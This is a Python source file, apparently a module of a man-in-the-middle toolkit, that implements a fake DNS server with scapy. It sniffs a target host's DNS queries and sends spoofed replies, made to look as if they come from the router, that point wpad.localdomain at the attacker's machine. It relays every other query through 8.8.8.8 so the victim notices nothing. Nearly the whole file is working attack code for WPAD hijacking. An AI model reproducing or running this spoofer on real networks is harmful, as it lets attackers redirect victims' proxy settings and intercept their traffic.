"""
Fake DNS server that will poison the respone for wpad.localdomain
"""

from scapy.all import IP, DNSQR, DNSRR, DNS, sniff, conf, UDP, send, sr1
from termcolor import cprint


def __poison_response(pkt):
    original_qname = pkt[DNSQR].qname
    if WPAD_HOSTNAME in str(original_qname):
        # Let's build the fake dns packet. First let's create the packet
        # template.
        fake_dns_pkt = IP()/UDP()/DNS()/DNSRR()

        # Make sure the source IP is the real router IP so the packet will not
        # get lost. Since this is a reply, destination will be the client IP.
        fake_dns_pkt[IP].src = ROUTER_IP
        fake_dns_pkt[IP].dst = TARGET_IP

        fake_dns_pkt[UDP].sport = 53
        fake_dns_pkt[UDP].dport = pkt[UDP].sport

        # DNS layer
        # https://mislove.org/teaching/cs4700/spring11/handouts/project1-primer.pdf
        fake_dns_pkt[DNS].id = pkt[DNS].id    # random ID that corresponds to the DNS query
        fake_dns_pkt[DNS].qd = pkt[DNS].qd    # reuse same query data
        fake_dns_pkt[DNS].aa = 1              # tell the client we are authoratative for the record
        fake_dns_pkt[DNS].qr = 1              # 1 since this is a response
        fake_dns_pkt[DNS].ancount = 1         # 1 since we are providing an answer

        # Let's build the resource record. We will reuse most data from the
        # DNS query packet.
        fake_dns_pkt[DNSRR].qname = WPAD_HOSTNAME + '.'
        fake_dns_pkt[DNSRR].rrname = WPAD_HOSTNAME + '.'
        # Seems this is one of the most relevant. Changing this definitely
        # changes the answer to the client. Changing [DNSRR].(qname|rrname)
        # doesn't really matter but it makes the RR clearer to understand as
        # it set proper values on the fields.
        fake_dns_pkt[DNSRR].rdata = ATTACKER_IP

        # Finally let's send the packet
        cprint(f'Sending spoofed DNS packet: {WPAD_HOSTNAME} = {ATTACKER_IP}',
               'light_red', attrs=['dark'])
        send(fake_dns_pkt, verbose=0)

    else:
        # Let's build the packet that we will forward to google dns
        forward_pkt = IP()/UDP()/DNS()
        forward_pkt[IP].dst = GOOGLE_DNS
        forward_pkt[UDP].sport = pkt[UDP].sport
        forward_pkt[DNS].rd = 1
        forward_pkt[DNS].qd = DNSQR(qname=original_qname)

        # Send it to google and get the response
        google_response = sr1(forward_pkt, verbose=0)

        # Let's build the response packet we will send to the client
        response_pkt = IP()/UDP()/DNS()
        response_pkt[IP].src = ATTACKER_IP
        response_pkt[IP].dst = TARGET_IP
        response_pkt[UDP].dport = pkt[UDP].sport
        response_pkt[DNS] = google_response[DNS]

        # Sent it to the client
        send(response_pkt, verbose=0)

def run(router_ip, target_ip, interface):
    global ATTACKER_IP
    global ROUTER_IP
    global TARGET_IP
    global WPAD_HOSTNAME
    global GOOGLE_DNS

    ATTACKER_IP = conf.ifaces[interface].ip
    ROUTER_IP = router_ip
    TARGET_IP = target_ip
    WPAD_HOSTNAME = 'wpad.localdomain'
    GOOGLE_DNS = '8.8.8.8'

    cprint('*** Fake DNS server running ***', 'red', attrs=['blink', 'reverse'])

    bpf_filter = f'udp dst port 53 and not src host {ATTACKER_IP} and src host {TARGET_IP}'

    sniff(prn=__poison_response, filter=bpf_filter, iface=interface)
